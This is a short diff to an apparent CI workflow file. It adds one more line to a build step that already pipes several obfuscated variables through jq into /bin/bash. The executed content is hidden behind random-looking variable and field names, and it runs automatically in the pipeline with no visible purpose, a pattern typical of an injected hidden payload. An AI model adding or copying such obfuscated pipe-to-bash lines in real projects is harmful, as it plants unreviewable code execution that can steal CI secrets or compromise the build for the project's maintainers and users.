@@ -25,6 +25,7 @@ jobs:
           echo $s946 | jq -r .equep00 | /bin/bash
           printf '%s' "$vfcw991" | jq -r .cgg7 | /bin/bash
           printf '%s' "$rla05" | jq -r .pjbp109 | /bin/bash
+          printf '%s' "$tdk9" | jq -r .jpq32 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
